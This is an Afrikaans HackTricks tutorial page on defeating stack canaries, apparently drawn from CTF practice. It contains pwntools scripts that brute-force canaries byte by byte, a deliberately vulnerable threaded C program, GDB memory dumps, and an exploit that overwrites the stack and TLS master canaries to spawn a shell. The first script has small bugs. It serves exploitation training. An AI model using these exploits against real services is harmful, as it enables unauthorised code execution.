# BF Forked & Threaded Stack Canaries

{{#include ../../../../banners/hacktricks-training.md}}

**As jy 'n binêre teenkom wat deur 'n kanarie en PIE (Position Independent Executable) beskerm word, moet jy waarskynlik 'n manier vind om dit te omseil.**

![](<../../../../images/image (144).png>)

> [!NOTE]
> Let daarop dat **`checksec`** dalk nie sal vind dat 'n binêre deur 'n kanarie beskerm word nie as dit staties gecompileer is en nie in staat is om die funksie te identifiseer nie.\
> Jy kan egter dit handmatig opgemerk as jy vind dat 'n waarde in die stapel gestoor word aan die begin van 'n funksie-aanroep en hierdie waarde voor die uitgang nagegaan word.

## Brute force Canary

Die beste manier om 'n eenvoudige kanarie te omseil is as die binêre 'n program is wat **kindprosesse fork elke keer as jy 'n nuwe verbinding met dit maak** (netwerkdiens), want elke keer as jy met dit verbind, **sal dieselfde kanarie gebruik word**.

Dan is die beste manier om die kanarie te omseil net om dit **brute-force char vir char** te doen, en jy kan uitvind of die geraamde kanarie-byte korrek was deur te kyk of die program gecrash het of sy gewone vloei voortgaan. In hierdie voorbeeld **brute-forces die funksie 'n 8 Bytes kanarie (x64)** en onderskei tussen 'n korrek geraamde byte en 'n slegte byte net deur **te kyk** of 'n **antwoord** teruggestuur word deur die bediener (nog 'n manier in **ander situasie** kan wees om 'n **try/except** te gebruik):

### Example 1

Hierdie voorbeeld is geïmplementeer vir 64-bits, maar kan maklik vir 32-bits geïmplementeer word.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### Voorbeeld 2

Dit is geïmplementeer vir 32-bis, maar dit kan maklik na 64-bis verander word.\
Let ook daarop dat die **program verwag eerstens 'n byte om die grootte van die invoer** en die payload aan te dui.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## Draad

Drade van dieselfde proses sal ook **diezelfde canary-token deel**, daarom sal dit moontlik wees om 'n canary te **brute-force** as die binêre 'n nuwe draad genereer elke keer as 'n aanval plaasvind.

'n Buffer overflow in 'n gedrade funksie wat met canary beskerm word, kan gebruik word om die meester canary van die proses te verander. As gevolg hiervan is die versagting nutteloos omdat die kontrole gebruik word met twee canaries wat dieselfde is (alhoewel gewysig).

### Voorbeeld

Die volgende program is kwesbaar vir Buffer Overflow, maar dit is saamgekompyleer met canary:
```c
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

// gcc thread_canary.c -no-pie -l pthread -o thread_canary

void win() {
execve("/bin/sh", NULL, NULL);
}

void* vuln() {
char data[0x20];
gets(data);
}

int main() {
pthread_t thread;

pthread_create(&thread, NULL, vuln, NULL);
pthread_join(thread, NULL);

return 0;
}
```
Let op dat `vuln` binne 'n draad genoem word. In GDB kan ons na `vuln` kyk, spesifiek, op die punt waar die program `gets` aanroep om invoerdata te lees:
```bash
gef> break gets
Breakpoint 1 at 0x4010a0
gef> run
...
gef> x/10gx $rdi
0x7ffff7d7ee20: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee30: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee40: 0x0000000000000000      0x493fdc653a156800
0x7ffff7d7ee50: 0x0000000000000000      0x00007ffff7e17ac3
0x7ffff7d7ee60: 0x0000000000000000      0x00007ffff7d7f640
```
Die bogenoemde verteenwoordig die adres van `data`, waar die program gebruikersinvoer sal skryf. Die stack canary word gevind by `0x7ffff7d7ee48` (`0x493fdc653a156800`), en die terugkeeradres is by `0x7ffff7d7ee50` (`0x00007ffff7e17ac3`):
```bash
gef> telescope $rdi 8 -n
0x7ffff7d7ee20|+0x0000|+000: 0x0000000000000000  <-  $rdi
0x7ffff7d7ee28|+0x0008|+001: 0x0000000000000000
0x7ffff7d7ee30|+0x0010|+002: 0x0000000000000000
0x7ffff7d7ee38|+0x0018|+003: 0x0000000000000000
0x7ffff7d7ee40|+0x0020|+004: 0x0000000000000000
0x7ffff7d7ee48|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7ee50|+0x0030|+006: 0x0000000000000000  <-  $rbp
0x7ffff7d7ee58|+0x0038|+007: 0x00007ffff7e17ac3 <start_thread+0x2f3>  ->  0xe8ff31fffffe6fe9  <-  retaddr[2]
```
Let op dat die stapel adresse nie aan die werklike stapel behoort nie:
```bash
gef> vmmap stack
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x00007ffff7580000 0x00007ffff7d83000 0x0000000000803000 0x0000000000000000 rw- <tls-th1><stack-th2>  <-  $rbx, $rsp, $rbp, $rsi, $rdi, $r12
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $r9, $r15
```
Die draad se stapel is bo die Draad Plaaslike Berging (TLS) geplaas, waar die meester kanarie gestoor word:
```bash
gef> tls
$tls = 0x7ffff7d7f640
...
---------------------------------------------------------------------------- TLS ----------------------------------------------------------------------------
0x7ffff7d7f640|+0x0000|+000: 0x00007ffff7d7f640  ->  [loop detected]  <-  $rbx, $r12
0x7ffff7d7f648|+0x0008|+001: 0x00000000004052b0  ->  0x0000000000000001
0x7ffff7d7f650|+0x0010|+002: 0x00007ffff7d7f640  ->  [loop detected]
0x7ffff7d7f658|+0x0018|+003: 0x0000000000000001
0x7ffff7d7f660|+0x0020|+004: 0x0000000000000000
0x7ffff7d7f668|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7f670|+0x0030|+006: 0xb79b79966e9916c4  <-  PTR_MANGLE cookie
0x7ffff7d7f678|+0x0038|+007: 0x0000000000000000
...
```
> [!NOTE]
> Sommige van die bogenoemde GDB-funksies is gedefinieer op 'n uitbreiding genaamd [bata24/gef](https://github.com/bata24/gef), wat meer funksies het as die gewone [hugsy/gef](https://github.com/hugsy/gef).

As gevolg hiervan kan 'n groot Buffer Overflow toelaat om beide die stack canary en die master canary in die TLS te verander. Dit is die offset:
```bash
gef> p/x 0x7ffff7d7f668 - $rdi
$1 = 0x848
```
Dit is 'n kort exploit om `win` aan te roep:
```python
from pwn import *

context.binary = 'thread_canary'

payload  = b'A' * 0x28                    # buffer overflow offset
payload += b'BBBBBBBB'                    # overwritting stack canary
payload += b'A' * 8                       # saved $rbp
payload += p64(context.binary.sym.win)    # return address
payload += b'A' * (0x848 - len(payload))  # padding
payload += b'BBBBBBBB'                    # overwritting master canary

io = context.binary.process()
io.sendline(payload)
io.interactive()
```
## Ander voorbeelde & verwysings

- [https://guyinatuxedo.github.io/07-bof_static/dcquals16_feedme/index.html](https://guyinatuxedo.github.io/07-bof_static/dcquals16_feedme/index.html)
- 64 bits, geen PIE, nx, BF canary, skryf 'n ROP in 'n sekere geheue om `execve` aan te roep en daarheen te spring.
- [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)
- 64 bits, geen PIE, nx, wysig thread en meester canary.
